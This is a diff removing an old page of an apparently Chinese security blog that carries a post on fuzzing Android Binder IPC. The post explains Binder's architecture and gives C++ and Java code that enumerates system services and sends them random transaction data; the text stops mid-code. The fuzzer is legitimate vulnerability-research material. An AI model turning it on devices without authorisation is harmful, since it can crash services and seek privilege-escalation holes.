@@ -1,1210 +1,246 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"usmacd.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-
-    <meta property="og:type" content="website">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>安全代码</title><meta name="author" content="henices"><meta name="copyright" content="henices"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="安全代码">
 <meta property="og:url" content="http://usmacd.com/page/6/index.html">
 <meta property="og:site_name" content="安全代码">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://usmacd.com/img/avatar.png">
 <meta property="article:author" content="henices">
 <meta name="twitter:card" content="summary">
-
-
-<link rel="canonical" href="http://usmacd.com/page/6/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/6/index.html","title":""}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>安全代码</title>
-  
-
-
-
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-<link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <h1 class="site-title">安全代码</h1>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="Search" role="button">
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li>
-  </ul>
-</nav>
-
-
-
-
-</header>
-        
-  
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-overview-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="henices"
-      src="/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">henices</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">102</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">15</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author animated">
-      <span class="links-of-author-item">
-        <a href="https://twitter.com/henices" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;henices" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="rss fa-fw"></i>RSS</a>
-      </span>
-  </div>
-
-        </div>
-      </div>
-    </div>
-
-    
-    <div class="sidebar-inner sidebar-blogroll">
-      <div class="links-of-blogroll animated">
-        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
-          Links
-        </div>
-        <ul class="links-of-blogroll-list">
-            <li class="links-of-blogroll-item">
-              <a href="http://scz.617.cn:8/" title="http:&#x2F;&#x2F;scz.617.cn:8&#x2F;" rel="noopener" target="_blank">飞花堂</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://www.v2ex.com/" title="https:&#x2F;&#x2F;www.v2ex.com&#x2F;" rel="noopener" target="_blank">V2EX</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://blog.forecho.com/" title="https:&#x2F;&#x2F;blog.forecho.com&#x2F;" rel="noopener" target="_blank">forecho</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://www.mrhuangtalk.com/" title="https:&#x2F;&#x2F;www.mrhuangtalk.com&#x2F;" rel="noopener" target="_blank">Mr.Huang talk</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://demochen.com/" title="https:&#x2F;&#x2F;demochen.com&#x2F;" rel="noopener" target="_blank">DemoChen</a>
-            </li>
-        </ul>
-      </div>
-    </div>
-  </aside>
-
-
-    </div>
-
-    <div class="main-inner index posts-expand">
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/Android_binder_fuzzing/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/Android_binder_fuzzing/" class="post-title-link" itemprop="url">Android Binder Fuzzing 的一些思路</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="1-binder-简介"><a href="#1-binder-简介" class="headerlink" title="1. binder 简介"></a>1. binder 简介</h2><p>Android安全模型的一个关键部分是每一个应用程序都被赋予一个唯一的 Linux 用户 ID 和组 ID，运行在自己的进程和 Dalvik 虚拟机里。<br>在应用程序安装的过程中，Android系统设备上创建一个专门的目录（文件夹），用于存储此应用程序的数据，并且仅允许应用程序利用<br>Linux 用户 ID 和组 ID 的相应访问权限对这些数据进行访问。此外，此应用程序的 Dalvik 虚拟机使用应用程序的用户 ID 运行在自己的进程中。<br>这些关键的机制在操作系统层面上强制数据安全，因为应用程序之间不共享内存、访问权限及磁盘存储。应用程序只能在它们自己的 Dalvik 虚拟机范围内访问内存和数据。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ps</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">u0_a16        2757   882 2574956 116944 SyS_epoll+          0 S com.google.android.gms.persistent</span><br><span class="line">u0_a128       2774   883 1939084  87720 SyS_epoll+          0 S com.ss.android.article.news:push</span><br><span class="line">u0_a16        2850   882 2322980  46592 SyS_epoll+          0 S com.google.process.gapps</span><br><span class="line">u0_a128       2887   883 2190568 181868 SyS_epoll+          0 S com.ss.android.article.news</span><br><span class="line">u0_a37        2900   882 2430908  58316 SyS_epoll+          0 S com.google.android.googlequicksearchbox:interactor</span><br><span class="line">nfc           2918   882 2351828  62356 SyS_epoll+          0 S com.android.nfc</span><br><span class="line">u0_a45        2930   882 2309884  43576 SyS_epoll+          0 S se.dirac.acs</span><br><span class="line">radio         2945   882 2313144  45592 SyS_epoll+          0 S net.oneplus.push</span><br><span class="line">u0_a0         2956   882 2304600  36360 SyS_epoll+          0 S com.oneplus</span><br><span class="line">system        2967   882 2307276  38088 SyS_epoll+          0 S com.fingerprints.serviceext</span><br><span class="line">system        2985   882 2309992  42044 SyS_epoll+          0 S com.oneplus.opbugreportlite</span><br><span class="line">u0_a142       2997   882 2370296  93324 SyS_epoll+          0 S com.oneplus.aod</span><br><span class="line">u0_a16        3018   882 2731976 165828 SyS_epoll+          0 S com.google.android.gms</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>Android app 是由 Activity、Service、Broadcast 和 Content Provider 四大组件构成，而这些组件可能运行在同一进程中，也可能运行在不同的<br>进程中，而像 PowerManagerService等重要服务都运行在核心进程 <code>system_server</code> 里，所以 Android 系统必须实现一个靠谱的进程间通信机制 （IPC）。<br>Android系统基于 Linux 开发，Linux 中有很多进程间通信的方法，如 Signal、Pipe、Socket、Share Memeory、Semaphore， 但是 Android 系统并没有使用<br>这些进程间通信的方法，而是基于 OpenBinder 自己开发了一套进程通信的方法，Binder 是 Android 系统 IPC 通信的机制。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell ps | grep system_server</span><br><span class="line">system 63 32 120160 35408 ffffffff afd0c738 S system_server</span><br><span class="line"></span><br><span class="line">$ adb logcat | grep &quot;63)&quot;</span><br><span class="line">...</span><br><span class="line">D/PowerManagerService( 63): bootCompleted</span><br><span class="line">I/TelephonyRegistry( 63): notifyServiceState: 0 home Android Android 310260 UMTS CSS not supp...</span><br><span class="line">I/TelephonyRegistry( 63): notifyDataConnection: state=0 isDataConnectivityPossible=false reason=null</span><br><span class="line">interfaceName=null networkType=3</span><br><span class="line">I/SearchManagerService( 63): Building list of searchable activities</span><br><span class="line">I/WifiService( 63): WifiService trying to setNumAllowed to 11 with persist set to true</span><br><span class="line">I/ActivityManager( 63): Config changed: &#123; scale=1.0 imsi=310/260 loc=en_US touch=3 keys=2/1/2 nav=3/1 ...</span><br><span class="line">I/TelephonyRegistry( 63): notifyMessageWaitingChanged: false</span><br><span class="line">I/TelephonyRegistry( 63): notifyCallForwardingChanged: false</span><br><span class="line">I/TelephonyRegistry( 63): notifyDataConnection: state=1 isDataConnectivityPossible=true reason=simL...</span><br><span class="line">I/TelephonyRegistry( 63): notifyDataConnection: state=2 isDataConnectivityPossible=true reason=simL...</span><br><span class="line">D/Tethering( 63): MasterInitialState.processMessage what=3</span><br><span class="line">I/ActivityManager( 63): Start proc android.process.media for broadcast</span><br><span class="line">com.android.providers.downloads/.DownloadReceiver: pid=223 uid=10002 gids=&#123;1015, 2001, 3003&#125;</span><br><span class="line">I/RecoverySystem( 63): No recovery log file</span><br><span class="line">W/WindowManager( 63): App freeze timeout expired.</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181226160614691_1337421380.png" alt="binder"></p>
-<h2 id="2-Binder-架构"><a href="#2-Binder-架构" class="headerlink" title="2. Binder 架构"></a>2. Binder 架构</h2><p>Binder 使用 CS （Client&#x2F;Server） 模型，提供服务的进程是 Server 进程，访问服务的是 Client 进程。从代码实现的角度看，Binder架构采用的是分层架构设计,<br>大致上可以分为 Java 层， Java IPC 层，Native IPC 层， Linux 内核层。</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181224151909041_1890401128.png" alt="1"></p>
-<p>从组件的视角来看，Binder 包含了 Client、Server、ServiceManger 和 binder 驱动， ServiceManager 用于管理系统中的各种服务，见下图。</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181224155625665_1820827979.gif" alt="2"></p>
-<p>图中虚线的箭头为跨进程的进程间通信，必须使用 Android IPC binder 机制。</p>
-<h2 id="3-为什么要-fuzz-binder"><a href="#3-为什么要-fuzz-binder" class="headerlink" title="3. 为什么要 fuzz binder"></a>3. 为什么要 fuzz binder</h2><p>把 Binder 作为一个目标的原因比较明显的，因为在 Android 的安全模型中，Binder 是一个重要的安全边界。在一个低权限<br>的 app 里面构造的数据，会在高权限的进程里面使用，如果发生问题，就是一个明显的权限提升漏洞。另外数据在处理的过程中，<br>有 flatten 和 unflatten 两个步骤，这些步骤就像我们平时说的编码和解码一样非常容易出问题。</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181225102933309_922476451.png" alt="weakness"></p>
-<p>存在一些非常经典的漏洞， 例如 CVE-2014-7911 该漏洞允许恶意应用从普通应用权限提权到system用户执行命令。</p>
-<h2 id="4-实现"><a href="#4-实现" class="headerlink" title="4. 实现"></a>4. 实现</h2><p>在每个层面都可以实现相关代码进行 Fuzz， 下面分析在每个层面的具体实现。</p>
-<h3 id="4-1-直接调用-ioctl"><a href="#4-1-直接调用-ioctl" class="headerlink" title="4.1  直接调用 ioctl"></a>4.1  直接调用 ioctl</h3><p>实现 Binder fuzzer 的方法有好几种，最直接的想法当然就是直接调用 ioctl 系统调用。</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181225101500954_2019536930.png" alt="ioctl"></p>
-<p>其中 fd 可以通过打开 &#x2F;dev&#x2F;binder 设备文件获得，难点在 <code>binder_write_read</code> 数据结构的构造。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/dev/binder&quot;</span>, O_RDWR);</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-2-Native-层"><a href="#4-2-Native-层" class="headerlink" title="4.2 Native 层"></a>4.2 Native 层</h3><p>在 Native 层，利用 IBinder 可以将问题简化， 看上面的结构图，通过阅读 Android 源码， 可以看出我们可以利用 IBinder<br>的 transcat 来调用相应的Binder 接口函数，参考：</p>
-<p><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/native/+/master/cmds/service/service.cpp">https://android.googlesource.com/platform/frameworks/native/+/master/cmds/service/service.cpp</a></p>
-<p>调用 IBinder 的 transact 需要自己填充 parcel 数据， 可以从下面的示意理解大致的含义：</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181226153937869_763457039.png" alt="5"></p>
-<p>code 为 Binder 调用接口的功能号， parcel 中需要指定调用那个接口。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String16 <span class="title">get_interface_name</span><span class="params">(sp&lt;IBinder&gt; service)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (service != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        Parcel data, reply;</span><br><span class="line">        <span class="type">status_t</span> err = service-&gt;<span class="built_in">transact</span>(IBinder::INTERFACE_TRANSACTION, data, &amp;reply);</span><br><span class="line">        <span class="keyword">if</span> (err == NO_ERROR) &#123;</span><br><span class="line">            <span class="keyword">return</span> reply.<span class="built_in">readString16</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String16</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>.</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sp&lt;IServiceManager&gt; sm = <span class="built_in">defaultServiceManager</span>();</span><br><span class="line">    Vector&lt;String16&gt; services = sm-&gt;<span class="built_in">listServices</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; services.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        String16 name = services[i];</span><br><span class="line">        sp&lt;IBinder&gt; service = sm-&gt;<span class="built_in">checkService</span>(name);</span><br><span class="line">        String16 ifName = <span class="built_in">get_interface_name</span>(service);</span><br><span class="line">        <span class="keyword">if</span> (service != <span class="literal">NULL</span> &amp;&amp; ifName.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">uint32_t</span> code = <span class="number">0</span>; code &lt;= <span class="number">100</span>; code++) &#123;</span><br><span class="line">                aout &lt;&lt; <span class="string">&quot;ifName: &quot;</span> &lt;&lt; ifName &lt;&lt; <span class="string">&quot;, code: &quot;</span> &lt;&lt; code &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">                Parcel data, reply;</span><br><span class="line">                data.<span class="built_in">writeInterfaceToken</span>(ifName);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">random</span>() % <span class="number">800</span>; i++ ) &#123;</span><br><span class="line">                    <span class="type">uint32_t</span> a = <span class="built_in">random</span>();</span><br><span class="line">                    aout &lt;&lt; <span class="string">&quot;data[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;]: &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">                    data.<span class="built_in">writeInt32</span>(a);</span><br><span class="line">                &#125;</span><br><span class="line">                service-&gt;<span class="built_in">transact</span>(code, data, &amp;reply, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-3-Java-应用层"><a href="#4-3-Java-应用层" class="headerlink" title="4.3 Java 应用层"></a>4.3 Java 应用层</h3><p>到了 Java 应用层，我们可以获得的信息就丰富了，可以获得详细的信息。</p>
-<h4 id="1-获取所有运行的services"><a href="#1-获取所有运行的services" class="headerlink" title="1) 获取所有运行的services"></a>1) 获取所有运行的services</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] getServices() &#123;</span><br><span class="line">    String[] services = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        services = (String[]) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;listServices&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> services;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-获得对应服务的IBinder-对象"><a href="#2-获得对应服务的IBinder-对象" class="headerlink" title="2) 获得对应服务的IBinder 对象"></a>2) 获得对应服务的IBinder 对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">getIBinder</span><span class="params">(String service)</span> &#123;</span><br><span class="line">    <span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, service);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-利用反射获取对应接口的所有code"><a href="#3-利用反射获取对应接口的所有code" class="headerlink" title="3) 利用反射获取对应接口的所有code"></a>3) 利用反射获取对应接口的所有code</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HashMap&lt;String,Integer&gt; <span class="title function_">getBinderCode</span><span class="params">(String interfaceDescriptor)</span> &#123;</span><br><span class="line">    HashMap&lt;String, Integer&gt; codes = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (interfaceDescriptor == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> codes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; cStub = Class</span><br><span class="line">                .forName(interfaceDescriptor + <span class="string">&quot;$Stub&quot;</span>);</span><br><span class="line">        Field[] f = cStub.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : f) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            String k= field.toString().split(<span class="string">&quot;\\$Stub\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (k.contains(<span class="string">&quot;TRANSACTION&quot;</span>))</span><br><span class="line">                codes.put(k, (<span class="type">int</span>)field.get(<span class="built_in">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> codes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-利用反射获取对应接口所有调用的参数类型"><a href="#4-利用反射获取对应接口所有调用的参数类型" class="headerlink" title="4) 利用反射获取对应接口所有调用的参数类型"></a>4) 利用反射获取对应接口所有调用的参数类型</h4><p>binder call 的参数类型</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HashMap&lt;String, List&lt;String&gt;&gt;</span><br><span class="line">    <span class="title function_">getBinderCallParameter</span><span class="params">(String interfaceDescriptor,</span></span><br><span class="line"><span class="params">                           HashMap&lt;String, Integer&gt; codes)</span> &#123;</span><br><span class="line">    HashMap&lt;String, List&lt;String&gt;&gt; ret = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (interfaceDescriptor == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; cStub = Class</span><br><span class="line">                .forName(interfaceDescriptor + <span class="string">&quot;$Stub$Proxy&quot;</span>);</span><br><span class="line">        Method[] m = cStub.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : m) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">func_code</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            List&lt;String&gt; func_parameter = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span 